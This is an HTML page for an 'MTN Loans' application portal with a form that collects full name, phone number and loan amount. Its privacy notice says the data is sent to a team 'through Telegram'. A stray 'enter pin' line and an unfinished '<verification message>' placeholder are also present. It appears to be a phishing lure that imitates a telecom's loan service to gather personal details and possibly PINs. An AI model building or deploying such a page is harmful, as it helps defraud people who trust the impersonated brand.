<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MTN Loans - Application</title>

    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background: #f5f5f5;
            color: #222;
        }

        header {
            background: #ffcc00;
            padding: 25px;
            text-align: center;
        }

        .container {
            max-width: 450px;
            margin: 30px auto;
            padding: 25px;
            background: white;
            border-radius: 12px;
            box-shadow: 0 3px 12px #0002;
        }

        h2 {
            text-align: center;
        }

        label {
            display: block;
            margin-top: 15px;
            font-weight: bold;
        }

        input {
            width: 100%;
            padding: 13px;
            margin-top: 7px;
            border: 1px solid #ccc;
            border-radius: 6px;
        }

        .privacy {
            margin-top: 20px;
            padding: 15px;
            background: #fff8dc;
            border-radius: 8px;
            font-size: 14px;
            line-height: 1.6;
        }

        .consent {
            display: flex;
            align-items: flex-start;
            gap: 10px;
            margin-top: 15px;
            font-weight: normal;
        }

        .consent input {
            width: auto;
            margin-top: 4px;
        }

        button {
            width: 100%;
            padding: 14px;
            margin-top: 20px;
            background: #ffcc00;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }

        footer {
            text-align: center;
            padding: 20px;
        }
    </style>
</head>

<body>

<header>
    <h1>MTN LOANS</h1>
    <p>Loan Application Portal</p>
</header>

<div class="container">

    <h2>Apply for a Loan</h2>

    <form action="/apply" method="POST">

        <label>Full Name</label>
        <input type="text" name="name" autocomplete="name" required>

        <label>Phone Number</label>
        <input type="tel" name="phone" autocomplete="tel" required>

        <label>Loan Amount</label>
        <input type="number" name="amount" min="1" required>

        <div class="privacy">
            <strong>Privacy Notice</strong>
            <p>
                Your name, phone number and requested loan amount
                will be shared with the authorized application
                processing team through Telegram for the purpose
                of handling your application.
            </p>
            <p>
            enter pin
            </p>
        </div>

        <label class="consent">
            <input type="checkbox" name="consent" value="yes" required>
            I understand and agree to the collection and sharing
            of the details above for application processing.
        </label>

        <button type="submit">Submit Application</button>

    </form>
<verification message>
</div>

<footer>
    © 2026 MTN Loans
</footer>

</body>
</html>
